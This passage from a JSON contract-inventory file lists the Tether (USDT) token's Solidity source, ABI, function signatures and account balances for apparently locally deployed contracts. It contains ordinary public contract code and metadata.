_upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": 